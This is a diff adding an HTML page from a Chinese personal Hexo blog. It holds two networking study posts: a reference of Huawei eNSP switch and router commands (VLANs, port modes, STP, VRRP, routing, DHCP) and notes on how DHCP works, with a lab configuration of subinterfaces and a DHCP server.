@@ -1,0 +1,967 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-CN">
+  
+
+    <head>
+      <meta charset="utf-8" />
+       
+      <meta name="keywords" content="Ymnnb" />
+       
+      <meta name="description" content="Ymnnb Blog" />
+      
+      <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1"
+      />
+      <title> Ymnnb</title>
+  <meta name="generator" content="hexo-theme-ayer">
+      
+      <link rel="shortcut icon" href="/1.ico" />
+       
+<link rel="stylesheet" href="/dist/main.css">
+
+      
+<link rel="stylesheet" href="/css/fonts/remixicon.css">
+
+      
+<link rel="stylesheet" href="/css/custom.css">
+ 
+      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
+       
+ 
+
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
+      />
+      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>
+
+      <!-- mermaid -->
+      
+      <style>
+        .swal2-styled.swal2-confirm {
+          font-size: 1.6rem;
+        }
+      </style>
+    </head>
+  </html>
+</html>
+
+
+<body>
+  <div id="app">
+    
+      
+    <main class="content on">
+      
+<section class="cover">
+    
+  <div class="cover-frame">
+    <div class="bg-box">
+      <img src="/images/cover1.jpg" alt="image frame" />
+    </div>
+    <div class="cover-inner text-center text-white">
+      <h1><a href="/">Ymnnb</a></h1>
+      <div id="subtitle-box">
+        
+        <span id="subtitle"></span>
+        
+      </div>
+      <div>
+        
+      </div>
+    </div>
+  </div>
+  <div class="cover-learn-more">
+    <a href="javascript:void(0)" class="anchor"><i class="ri-arrow-down-line"></i></a>
+  </div>
+</section>
+
+
+
+<script src="https://cdn.staticfile.org/typed.js/2.0.12/typed.min.js"></script>
+
+
+<!-- Subtitle -->
+
+  <script>
+    try {
+      var typed = new Typed("#subtitle", {
+        strings: ['Ymnnb', 'Ymnnb！', '我想去看海'],
+        startDelay: 0,
+        typeSpeed: 200,
+        loop: true,
+        backSpeed: 100,
+        showCursor: true
+      });
+    } catch (err) {
+      console.log(err)
+    }
+  </script>
+  
+<div id="main">
+  <section class="outer">
+  
+  <ul class="ads">
+    
+        <li>
+            <a href="">
+                <img src="" width="300" alt="">
+            </a>
+        </li>
+    
+        <li>
+            <a href="">
+                <img src="" width="300" alt="">
+            </a>
+        </li>
+    
+</ul>
+  
+  
+  
+
+<div class="notice" style="margin-top:50px">
+    <i class="ri-heart-fill"></i>
+    <div class="notice-content" id="broad"></div>
+</div>
+<script type="text/javascript">
+    fetch('https://v1.hitokoto.cn')
+        .then(response => response.json())
+        .then(data => {
+            document.getElementById("broad").innerHTML = data.hitokoto;
+        })
+        .catch(console.error)
+</script>
+
+<style>
+    .notice {
+        padding: 20px;
+        border: 1px dashed #e6e6e6;
+        color: #969696;
+        position: relative;
+        display: inline-block;
+        width: 100%;
+        background: #fbfbfb50;
+        border-radius: 10px;
+    }
+
+    .notice i {
+        float: left;
+        color: #999;
+        font-size: 16px;
+        padding-right: 10px;
+        vertical-align: middle;
+        margin-top: -2px;
+    }
+
+    .notice-content {
+        display: initial;
+        vertical-align: middle;
+    }
+</style>
+  
+  <article class="articles">
+    
+    
+    
+    
+    <article
+  id="post-ensp简单命令"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+     
+    <div class="article-meta">
+      <a href="/2024/07/29/ensp%E7%AE%80%E5%8D%95%E5%91%BD%E4%BB%A4/" class="article-date">
+  <time datetime="2024-07-29T10:28:11.164Z" itemprop="datePublished">2024-07-29</time>
+</a>    
+    </div>
+      
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="一、华为设备命令视图"><a href="#一、华为设备命令视图" class="headerlink" title="一、华为设备命令视图"></a>一、华为设备命令视图</h1><p>以下是华为设备的常用命令视图：<br>用户视图：&lt; Huawei&gt;<br>系统视图：&lt; Huawei&gt;system-view&#x2F;sys [Huawei]<br>接口视图：<br>&lt; Huawei&gt;system-view&#x2F;sys<br>[Huawei]interface&#x2F;int Ethernet0&#x2F;0&#x2F;1<br>[Huawei- Ethernet0&#x2F;0&#x2F;1]<br>路由协议视图：[Huawei]isis<br>[Huawei- isis-1]</p>
+<h1 id="二、设置设备名称"><a href="#二、设置设备名称" class="headerlink" title="二、设置设备名称"></a>二、设置设备名称</h1><p>sysname&#x2F;sy命令设置设备的名称<br>&lt; Huawei&gt; system-view<br>[Huawei] sysname Switch 更改设备名称<br>[Switch]</p>
+<h1 id="三、常用基本命令"><a href="#三、常用基本命令" class="headerlink" title="三、常用基本命令"></a>三、常用基本命令</h1><p>1、quit 命令 返回上一级视图<br>2、return 命令 直接返回&lt; Huawei&gt;用户视图<br>3、save 命令 在&lt; Huawei&gt;用户视图使用，保存配置<br>4、reboot 命令 重启设备<br>5、shutdown 命令 关闭端口<br>undo shutdown 命令 激活端口<br>6、undo 命令，有以下：<br>（1）用于恢复缺省情况（例如设置设备的名称）<br>&lt; Huawei&gt; system-view<br>[Huawei] sysname Switch<br>[Switch] undo sysname 恢复缺省情况<br>[Huawei]<br>（2）用于禁用某个功能（例如ftp）<br>&lt; Huawei&gt; system-view<br>[Huawei] ftp server enable<br>[Huawei] undo ftp server 禁用设备的ftp功能<br>（3）用于删除某项设置<br>undo后跟某项命令的设置信息即可删除相关的某项配置</p>
+<h1 id="四、关闭泛洪信息"><a href="#四、关闭泛洪信息" class="headerlink" title="四、关闭泛洪信息"></a>四、关闭泛洪信息</h1><p>&lt; Huawei&gt;undo ter mon 关闭终端显示信息中心发送信息</p>
+<h1 id="五、设置设备接口的ip地址和子网掩码"><a href="#五、设置设备接口的ip地址和子网掩码" class="headerlink" title="五、设置设备接口的ip地址和子网掩码"></a>五、设置设备接口的ip地址和子网掩码</h1><p>[Huawei] interface 接口 进入接口视图<br>[Huawei- Ethernet0&#x2F;0&#x2F;1]ip address ip地址 子网掩码 配置ip地址和子网掩码<br>[Huawei- Ethernet0&#x2F;0&#x2F;1]undo shutdown 启动接口<br>[Huawei- Ethernet0&#x2F;0&#x2F;1]display interface 接口 查看接口状态</p>
+<h1 id="六、交换机的登陆"><a href="#六、交换机的登陆" class="headerlink" title="六、交换机的登陆"></a>六、交换机的登陆</h1><p>(一)设置Console接口密码<br>[Huawei]user-interface console 0 进入控制台接口<br>[Huawei-ui-console0]authentication-mode password 设置认证方式为密码认证<br>[Huawei-ui-console0]set authentication password cipher&#x2F;simple 密码<br>配置密文&#x2F;明文密码<br>[Huawei-ui-console0]user privilege level 级别 配置用户级别，级别可为0-15</p>
+<p>(二)设置Telnet接口密码<br>[Huawei]user-interface vty 0 4 进入VTY接口，最多允许5个用户同时登陆<br>[Huawei-ui-vty0-4]authentication-mode aaa 认证方式为aaa模式<br>[Huawei]aaa 进入aaa配置<br>[Huawei-aaa]local-user 用户名 password cipher&#x2F;simple 密码<br>设置用户的密码<br>[Huawei-aaa]local-user 用户名 service-type telnet<br>设置用户的服务类型协议为telnet，也可以为其它协议，比如http即使用Web界面<br>[Huawei-aaa]local-user 用户名 privilege level 级别 配置用户级别</p>
+<h1 id="七、VLAN配置"><a href="#七、VLAN配置" class="headerlink" title="七、VLAN配置"></a>七、VLAN配置</h1><p>(一)单独和批次创建VLAN<br>&lt; Huawei&gt;system-view<br>[Huawei]vlan 10 创建或进入VLAN10<br>[Huawei]vlan batch 10 to 20 创建VLAN10到VLAN20，共创建11个VLAN<br>batch to表示创建连续的VLAN，若省略to则创建或进入指定号码的VLAN</p>
+<p>(二)进入VLAN视图<br>[Huawei]vlan 10 若已创建vlan，则进入该VLAN视图；若没有则创建VLAN10<br>[Huawei-vlan10]name huawei 配置vlan10的名称为huawei<br>[Huawei]vlan vlan-name huawei 通过更改的VLAN名称进入VLAN视图</p>
+<p>(三)将端口指定到VLAN<br>1、单一端口指定VLAN<br>[Huawei]interface GigabitEthernet 0&#x2F;0&#x2F;1<br>[Huawei-GigabitEthernet 0&#x2F;0&#x2F;1]port link-type access<br>配置接口类型为access<br>[Huawei-GigabitEthernet 0&#x2F;0&#x2F;1]port default vlan ID号<br>配置端口的缺省的VLAN并将接口加入到指定vlan</p>
+<p>2、多个端口指定VLAN<br>[Huawei]vlan 10 进入相关VLAN的视图，这里表示进入vlan10<br>[Huawei-vlan10]port GigabitEthernet 0&#x2F;0&#x2F;1 to 0&#x2F;0&#x2F;10 将多个端口一并设置为相关VLAN，这里是将1~10号接口全部设置为VLAN10</p>
+<p>(四)查看配置情况<br>[Huawei]dislay vlan ID号</p>
+<p>[Huawei]display current-configuration 显示当前配置</p>
+<h1 id="八、交换机端口工作模式"><a href="#八、交换机端口工作模式" class="headerlink" title="八、交换机端口工作模式"></a>八、交换机端口工作模式</h1><p>(一)Access模式(接入模式)<br>Access端口只属于单个VLAN，一般用于连接计算机的端口，即只运行设置一个VLAN，丢弃其它VLAN。<br>[Huawei]interface GigabitEthernet 0&#x2F;0&#x2F;1 进入接口视图<br>[Huawei-GigabitEthernet 0&#x2F;0&#x2F;1]port link-type access 设<br>置端口工作模式为access<br>[Huawei-GigabitEthernet 0&#x2F;0&#x2F;1]port default vlan ID号 配置端口的缺省的VLAN并将接口加入到指定vlan</p>
+<p>(二)Trunk模式<br>Trunk端口允许多个VLAN通过，可以接收和发送多个VLAN报文，一般用于交换机之间端口，只允许默认VLAN报文发送时不打标签，带有标签的数据被转发至另一个交换机Trunk端口。<br>[Huawei]interface GigabitEthernet 0&#x2F;0&#x2F;1<br>[Huawei-GigabitEthernet 0&#x2F;0&#x2F;1]port link-type trunk 设置端口工作模式为trunk<br>[Huawei-GigabitEthernet 0&#x2F;0&#x2F;1]port trunk pvid vlan ID号 指定端口的PVID值<br>[Huawei-GigabitEthernet 0&#x2F;0&#x2F;1]port trunk allow-pass vlan all&#x2F;ID号<br>允许所有或部分VLAN通过trunk口</p>
+<p>(三)Hybrid模式<br>Hybrid端口和Trunk端口一样，不过它既能用于交换机也能用于计算机，允许多个VLAN报文发送时不打标签。<br>[Huawei]interface GigabitEthernet 0&#x2F;0&#x2F;1<br>[Huawei-GigabitEthernet 0&#x2F;0&#x2F;1]port link-type hybrid 设置端口工作模式为hybrid<br>[Huawei-GigabitEthernet 0&#x2F;0&#x2F;1]port hybrid pvid vlan ID号 指定端口的PVID值<br>[Huawei-GigabitEthernet 0&#x2F;0&#x2F;1]port hybrid tagged vlan ID号<br>指定相关VLAN的数据发送时添加Tag<br>[Huawei-GigabitEthernet 0&#x2F;0&#x2F;1]port hybrid tagged(untagged) vlan all&#x2F;ID号<br>允许hybrid端口对所有或部分VLAN添加(不添加）Tag</p>
+<h1 id="九、QinQ技术"><a href="#九、QinQ技术" class="headerlink" title="九、QinQ技术"></a>九、QinQ技术</h1><p>QinQ技术用于解决公网VLAN ID的资源紧缺问题，在IEEE 802.1Q协议标签前再次封装IEEE802.1Q协议标签，其中一层标识用户系统网络，另一层标识网络业务。<br>[Huawei]interface GigabitEthernet 0&#x2F;0&#x2F;1<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;1]port link-type dot1q-tunnel 设置交换机端口类型为QinQ端口</p>
+<h1 id="十、VCMP（VLAN集中管理协议）"><a href="#十、VCMP（VLAN集中管理协议）" class="headerlink" title="十、VCMP（VLAN集中管理协议）"></a>十、VCMP（VLAN集中管理协议）</h1><p>VLAN集中管理协议可实现在一台交换机上创建、删除VLAN，提供一种在二层网络中传播VLAN配置信息（域内所有指定的其他交换机自动同步创建、删除相应的VLAN），简单的来说，只需在一台交换机上进行创建、删除VLAN的操作，这些操作会同步至指定的所以交换机，从而大大地减少了工作量，并保证了各修改的一致性。</p>
+<p>1、配置交换机接口的链路类型<br>在VCMP管理域中，通过Trunk或Hybrid链路接口连接的同组域名相同的交换机，所以执行命令port link-type { trunk | hybrid }指定接口的链路类型为Trunk或Hybrid，即在进入相应接口后，输入命令port link-type类型，指定配置接口类型。<br>2、配置VCMP角色</p>
+<p>配置角色为服务器角色，缺省时，VCMP管理域中的角色是client。<br>&lt; Huawei&gt;system-view<br>[Huawei]vcmp role server&#x2F;client&#x2F;silent&#x2F;transparent<br>3、配置管理域的域名和管理域认证密码</p>
+<p>在同一VCMP管理域内的每台交换机的域名必须是相同的；管理域认证密码这一步是可选的，即也可以不配置认证密码，缺省情况下，没有配置认证密码，VCMP报文直接认证通过。要注意若设置了认证密码，则Server与所有Client上的密码是要保持一致的，执行命令vcmp authentication sha2-256 password 认证密码，配置VCMP管理域的认证密码。<br>[Huawei]vcmp 设备ID号 设备名称 配置相应域名<br>[Huawei]vcmp authentication 设备名称 password 密码<br>[Huawei]interface GigabitEthernet 0&#x2F;0&#x2F;1 进入需要使能VCMP功能的以太网接口视图，在二层以太网接口上使能，比如这里就是进入GigabitEthernet 0&#x2F;0&#x2F;1接口<br>4、使能VCMP功能的接口</p>
+<p>通过interface命令后跟接口名称，进入需要使能VCMP功能的接口视图，使二层以太网处于使能状态，通过执行undo vcmp disable使基于接口使能VCMP功能，缺省情况下，交换机上的所有接口的VCMP功能处于使能状态。<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;1]undo vcmp disable 基于该接口使能VCMP功能，缺省情况时则交换机上所有接口的VCMP功能处于使能状态</p>
+<h1 id="十一、GVRP-VLAN注册协议"><a href="#十一、GVRP-VLAN注册协议" class="headerlink" title="十一、GVRP(VLAN注册协议)"></a>十一、GVRP(VLAN注册协议)</h1><p>GVRP协议用于注册和注销VLAN属性，手工配置的VLAN称为静态VLAN，而通过GVRP协议创建的VLAN称为动态VLAN。</p>
+<p>&lt; Huawei&gt;system-view<br>[Huawei]vcmp role silent 配置GVRP之前必须要将VCMP角色设置为Silent或Transparent<br>[Huawei]gvrp 全局使能GVRP功能<br>[Huawei]interface GigabitEthernet 0&#x2F;0&#x2F;1 进入相关接口<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;1]port link-type trunk 配置接口为trunk类型<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;1]port trunk allow-pass vlan all 允许所有的VLAN通过该接口<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;1]gvrp 在接口下执行命令使能接口GVRP功能<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;1]gvrp registration normal 设置GVRP接口注册模式为normal，简化配置</p>
+<p>[Huawei]display gvrp statistics 在交换机上查看接口的GVRP统计信息</p>
+<h1 id="十二、STP（生成树协议）"><a href="#十二、STP（生成树协议）" class="headerlink" title="十二、STP（生成树协议）"></a>十二、STP（生成树协议）</h1><p>生成树协议是一种链路管理协议，为网络提供路径冗余，同时防止产生环路。</p>
+<p>&lt; Huawei&gt;system-view<br>[Huawei]stp enable 启动生成树协议<br>[Huawei]stp root primary 配置本桥为根桥</p>
+<p>[Huawei]display stp brief 在交换机上查看端口状态和端口的保护类型</p>
+<h1 id="十三、VRRP-虚拟路由冗余协议"><a href="#十三、VRRP-虚拟路由冗余协议" class="headerlink" title="十三、VRRP(虚拟路由冗余协议)"></a>十三、VRRP(虚拟路由冗余协议)</h1><p>虚拟路由冗余协议用于解决局域网中配置静态网关出现单点失效现象的路由协议，可以配置一个交换机群集，通过该协议能实现主设备和备用设备共同分担用户业务的配置。</p>
+<p>&lt; Huawei&gt;system-view<br>[Huawei]interface Ethernet0&#x2F;0&#x2F;1<br>[Huawei- Ethernet0&#x2F;0&#x2F;1]ip addres ip地址 子网掩码</p>
+<p>[Huawei]interface Ethernet0&#x2F;0&#x2F;2<br>[Huawei- Ethernet0&#x2F;0&#x2F;2]ip addres ip地址 子网掩码 配置连接主机的接口IP地址<br>[Huawei- Ethernet0&#x2F;0&#x2F;2]vrrp vrid 1 virtual-ip ip地址 配置备份组1的虚拟网关地址<br>[Huawei- Ethernet0&#x2F;0&#x2F;2]vrrp vrid 1 priority 优先级 配置路由器在备份组1中的优先级[Huawei- Ethernet0&#x2F;0&#x2F;2]vrrp vrid 2 virtual-ip ip地址 配置备份组2的虚拟网关地址</p>
+<p>[Huawei]display vrrp 查看路由器的VRRP状态</p>
+<h1 id="十四、BFD（双向转发检测）"><a href="#十四、BFD（双向转发检测）" class="headerlink" title="十四、BFD（双向转发检测）"></a>十四、BFD（双向转发检测）</h1><p>BFD是一种快速检测、监控网络中链路或IP路由的转发连通状况的全网统一的检测机制。</p>
+<p>&lt; Huawei&gt;system-view<br>[Huawei]bfd 使能全局BFD功能并进入BFD视图<br>*[Huawei]default-ip-address 组播ip地址 配置BFD缺省组播IP地址，缺省情况下，使用组播地址224.0.0.184</p>
+<p>[Huawei]bfd 会话设备名称 bind peer-ip ip地址 interface端口类型 端口号 若有IP地址的三层接口时，创建BFD会话的绑定信息<br>&#x2F;<br>[Huawei]bfd 会话设备名称 bind peer-ip default-ip interface 端口类型 端口号 若为二或无IP的三层接口时，创建组播BFD<br>[Huawei]discriminator local 标识符值 配置BFD会话的本地标识符<br>[Huawei]discriminator remote 标识符值 配置BFD会话的远端标识符<br>[Huawei]commit 提交配置</p>
+<h1 id="十五、显示路由器的路由"><a href="#十五、显示路由器的路由" class="headerlink" title="十五、显示路由器的路由"></a>十五、显示路由器的路由</h1><p>&lt; Huawei&gt;display ip routing-table 显示路由器的路由<br>&lt; Huawei&gt;display ip routing-table verbos 显示路由表的详细信息<br>&lt; Huawei&gt;display ip routing-table acl 编号值 显示通过ACL编号为某值过滤的激活路由的概要信息<br>&lt; Huawei&gt;display ip routing-table 目标网络的网络地址 子网掩码 网关 根据下一跳显示某目的地址的路由</p>
+<h1 id="十六、静态路由、默认路由的配置"><a href="#十六、静态路由、默认路由的配置" class="headerlink" title="十六、静态路由、默认路由的配置"></a>十六、静态路由、默认路由的配置</h1><p>静态路由指定某一网络访问所需要经过的路径，而默认路由是一种特殊的静态路由，当路由表中与包的目的地址之间没有匹配的表项时，路由器做出选择。</p>
+<p>&lt; Huawei&gt;system-view<br>[Huawei]ip routing-static 0.0.0.0 0.0.0.0 默认网关地址 配置默认路由，从而简化配置，提高网络性能</p>
+<p>[Huawei]ip routing-static 目标网络的网络地址 子网掩码 网关 配置静态路由，其中网关处的IP地址说明了路由下一站</p>
+<h1 id="十七、向当前路由表中添加一条新的路由表条目"><a href="#十七、向当前路由表中添加一条新的路由表条目" class="headerlink" title="十七、向当前路由表中添加一条新的路由表条目"></a>十七、向当前路由表中添加一条新的路由表条目</h1><p>[Huawei]route add 210.43.230.33 mask 255.255.255.224 202.103.123.7 metric 5<br>&#x2F;&#x2F;设定一个到目的网络210.43.230.33的路由，中间经过5个路由器网段，首先经过本地网络上的一个路由器IP为202.103.123.7，子网掩码为255.255.255.224</p>
+<h1 id="十八、DHCP（动态主机配置协议）"><a href="#十八、DHCP（动态主机配置协议）" class="headerlink" title="十八、DHCP（动态主机配置协议）"></a>十八、DHCP（动态主机配置协议）</h1><p>动态主机配置协议是基于BOOTP上的改进所来的主机配置协议，通过该协议，DHCP服务器为DHCP客户端进行动态IP地址分配，即不必指明DHCP服务器的IP地址就能获得DHCP服务。</p>
+<p>&lt; Huawei&gt;system-view<br>[Huawei]dhcp option template template1 设置分配的分配的启动配置文件<br>[Huawei-dhcp-option-template-template1]gateway-list 网关地址 配置网关地址<br>[Huawei-dhcp-option-template-template1]bootfile configuration.ini 获取配置文件<br>[Huawei-dhcp-option-template-template1]next-server 配置文件地址 配置获取配置文件地址</p>
+<p>(一)接口模式的DHCP命令<br>[Huawei]dhcp enable 开启DHCP配置功能<br>[Huawei]int g0&#x2F;0&#x2F;1 进入相关接口进行接口模式的DHCP配置<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;1]ip address ip地址 子网掩码<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;1]dhcp select interface 开启接口的DHCP功能<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;1]dhcp server excluded-ip-address 单个要排除的ip地址或两个ip地址即范围<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;1]dhcp server lease day 天 hour 时 minute 分 设置地址池ip租用有效期<br>&#x2F;*[Huawei- GigabitEthernet0&#x2F;0&#x2F;1]lease unlimited 租期无限制<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;1]dhcp server dns-list 主要DNS 备用DNS 设置DNS<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;1]dhcp select interface 开启接口的DHCP功能使其从接口地址池分配地址</p>
+<p>(二)全局模式的DHCP命令<br>[Huawei]dhcp enable<br>[Huawei]ip pool HUAWEI 创建全局地址池，pool后跟名称，这里是HUAWEI<br>[Huawei-ip-pool-HUAWEI]network ip地址 mask 子网掩码 设置全局地址池的范围<br>[Huawei-ip-pool-HUAWEI]getway-list 网关地址 设置分配的网关地址<br>[Huawei-ip-pool-HUAWEI]excluded-ip-address ip地址 ip地址 设置不参与动态分配的地址，可以是一个范围<br>[Huawei-ip-pool-HUAWEI]dhcp server dns-list 主要DNS 备用DNS 设置DNS<br>[Huawei-ip-pool-HUAWEI]lease day 天 hour 时 minute 分 设置地址池ip租用有效期<br>&#x2F;*[Huawei-ip-pool-HUAWEI]lease unlimited 租期无限制<br>[Huawei-ip-pool-HUAWEI]static-bind ip-address ip地址 mac-address MAC地址 option- template template1 对某个MAC地址进行绑定，给该MAC地址分配固定的IP地址<br>[Huawei]int g0&#x2F;0&#x2F;1 进入相关接口<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;1]dhcp select global 指定该接口采用全局地址池为客户端分配ip地址<br>&lt; Huawei&gt;dis ip pool name 全局地址池名称 all 查看全局地址池的分配信息</p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+    </footer>
+  </div>
+
+   
+   
+  
+</article>
+
+    
+    <article
+  id="post-DHCP"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+     
+    <div class="article-meta">
+      <a href="/2024/07/29/DHCP/" class="article-date">
+  <time datetime="2024-07-29T10:28:11.162Z" itemprop="datePublished">2024-07-29</time>
+</a>    
+    </div>
+      
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="DHCP协议原理"><a href="#DHCP协议原理" class="headerlink" title="DHCP协议原理"></a>DHCP协议原理</h1><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>一个网络如果要正常地运行，则网络中的主机（Host）必需要知道某些重要的网络参数，如IP地址、网络掩码、网关地址、DNS服务器地址、网络打印机地址等等。显然，在每台主机上都采用手工方式来配置这些参数是非常困难的、或是根本不可能的。</p>
+<p>因此有了  动态主机配置协议 DHCP</p>
+<p>DHCP的应用，实现了网络参数配置过程的自动化。那么DHCP技术具体是如何实现的呢？面对网络规模的扩大，DHCP又是如何应对的？面对网络中的攻击， DHCP又是如何防护的呢？</p>
+<h2 id="DHCP工作流程："><a href="#DHCP工作流程：" class="headerlink" title="DHCP工作流程："></a>DHCP工作流程：</h2><h3 id="IP地址分配方式-："><a href="#IP地址分配方式-：" class="headerlink" title="IP地址分配方式 ："></a>IP地址分配方式 ：</h3><p>DHCP SERVER负责接收客户端的DHCP请求，集中管理所有客户机的IP地址设定资料，并负责处理客户端的DHCP请求，相比于BOOTP，DHCP通过“租约”来实现动态分配IP的功能，实现IP的时分复用，从而解决IP资源短缺的问题。</p>
+<p>其地址分配方式有如下三种</p>
+<p>·人工配置：由管理员对每台具体的计算机指定一个地址<br>·自动配置：服务器为第一次连接网络的计算机分配一个永久地址，DHCP客户端第一次成功地从DHCP服务器端分配到一个IP地址之后，就永远使用这个地址<br>·动态配置：在一定的期限内将地址租给计算机，客户端第一次从DHCP服务器分配到IP地址后，并非永久地使用该地址，每次使用完后，DHCP客户端就得释放这个IP地址，并且租期结束后客户必须续租或者停用该地址，而对于路由器，经常使用的地址分配方式是动态配置。</p>
+<h3 id="比较："><a href="#比较：" class="headerlink" title="比较："></a>比较：</h3><p>传统的手工配置网络参数需要每个用户都手动配置IP地址、掩码、网关、DNS等多个参数</p>
+<p>随着用户规模的扩大及用户位置的不固定性，传统的静态手工配置方式已经无法满足需求，为了实现网络可以动态合理地分配IP地址给主机使用，需要用到动态主机配置协议DHCP。<br>DHCP相对于静态手工配置有如下优点：效率高 灵活性强 易于管理</p>
+<h2 id="租约表"><a href="#租约表" class="headerlink" title="租约表"></a>租约表</h2><ul>
+<li>静态租约表：对应一个静态租约存储文件，server运行时从文件中读取静态租约表。</li>
+<li>动态租约表：对应一个周期存储文件，server周期性将租约表存进该文件，在程序开始时将会读取上次存放的租约表。（租约表记录了当前所有分配的租约，包括静态链接的）。</li>
+<li>DHCP服务器是一直处在被动接受请求的状态，当有客户端请求时，服务器会读取获得客户端当前所在的状态以及客户端的信息，并在静态租约表和动态租约表中进行检索找到相应的表项，再根据客户端的状态执行不同的回复。</li>
+<li>当收到客户端的首次请求时，DHCP服务器先查找静态租约表；若存在请求的表项，返回这个客户的静态IP地址；否则，从IP地址池中选择可用的IP分配给客户，并添加信息到动态数据库中。此外，服务器将会周期性的刷新租约表写入文件存档，在这个过程中会顺便对动态租约表进行租期检查。</li>
+</ul>
+<h2 id="DHCP工作流程：-1"><a href="#DHCP工作流程：-1" class="headerlink" title="DHCP工作流程："></a>DHCP工作流程：</h2><p>见ppt</p>
+<h1 id="DHCP"><a href="#DHCP" class="headerlink" title="DHCP"></a>DHCP</h1><h2 id="PC1通过dhcp-接口复制实现IP地址分配："><a href="#PC1通过dhcp-接口复制实现IP地址分配：" class="headerlink" title="PC1通过dhcp 接口复制实现IP地址分配："></a>PC1通过dhcp 接口复制实现IP地址分配：</h2><p><Huawei>sys<br>[Huawei]vlan bat 10 20 30	</p>
+<p>[Huawei]int e0&#x2F;0&#x2F;2<br>[Huawei-Ethernet0&#x2F;0&#x2F;2]port link-type access<br>[Huawei-Ethernet0&#x2F;0&#x2F;2]port default vlan 10</p>
+<p>[Huawei-Ethernet0&#x2F;0&#x2F;2]int e0&#x2F;0&#x2F;1<br>[Huawei-Ethernet0&#x2F;0&#x2F;1]port link-type access<br>[Huawei-Ethernet0&#x2F;0&#x2F;1]port default vlan 20</p>
+<p>[Huawei-Ethernet0&#x2F;0&#x2F;1]int e0&#x2F;0&#x2F;4<br>[Huawei-Ethernet0&#x2F;0&#x2F;4]port link-type access<br>[Huawei-Ethernet0&#x2F;0&#x2F;4]port default vlan 30<br>在LSW3创建3个vlan,分别进入端口2,1,4配置接口类型为access，配置上对应的vlan</p>
+<p>[Huawei-Ethernet0&#x2F;0&#x2F;4]int e0&#x2F;0&#x2F;3<br>[Huawei-Ethernet0&#x2F;0&#x2F;3]port link-type trunk 	<br>[Huawei-Ethernet0&#x2F;0&#x2F;3]port trunk allow-pass vlan 10 20 30<br>接口3配置trunk接口，允许vlan10,20,30通过</p>
+<p>路由器AR1接受10 20 30的流量通过，设置单臂路由的子接口<br>比如：<br>0.1:192.168.1.1&#x2F;24<br>0.2:192.168.2.1&#x2F;24<br>0.3:192.168.3.1&#x2F;24<br>三个子接口分别去接收3个vlan<br>[Huawei]int g0&#x2F;0&#x2F;0.1<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;0.1]dot1q termination vid 10<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;0.1]ip add 192.168.1.1 24<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;0.1]<br>May 13 2024 17:12:30-08:00 Huawei %%01IFNET&#x2F;4&#x2F;LINK_STATE(l)[0]:The line protocol<br> IP on the interface GigabitEthernet0&#x2F;0&#x2F;0.1 has entered the UP state.<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;0.1]arp broadcast enable </p>
+<p>[Huawei-GigabitEthernet0&#x2F;0&#x2F;0.1]int g0&#x2F;0&#x2F;0.2<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;0.2]dot1q termination vid 20<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;0.2]ip add 192.168.2.1 24<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;0.2]arp broadcast enable</p>
+<p>[Huawei-GigabitEthernet0&#x2F;0&#x2F;0.2]int g0&#x2F;0&#x2F;0.3<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;0.3]ip add 192.168.3.1 24<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;0.3]dot1q termination vid 30<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;0.3]arp broadcast enable</p>
+<p>打开路由器的DHCP功能<br>[Huawei]dhcp enable<br>[Huawei]int g0&#x2F;0&#x2F;0.1<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;0.1]dhcp select interface<br>这个命令代表了：当前接口下的客户端，会被分配到当前接口下的ip地址192.168.1.0网段的ip地址</p>
+<p>[Huawei-GigabitEthernet0&#x2F;0&#x2F;0.1]dhcp server dns-list 61.139.2.69<br>设置dns服务器，61.139.2.69是成都DNS服务器<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;0.1]dhcp server lease day 1<br>设置租约为1天</p>
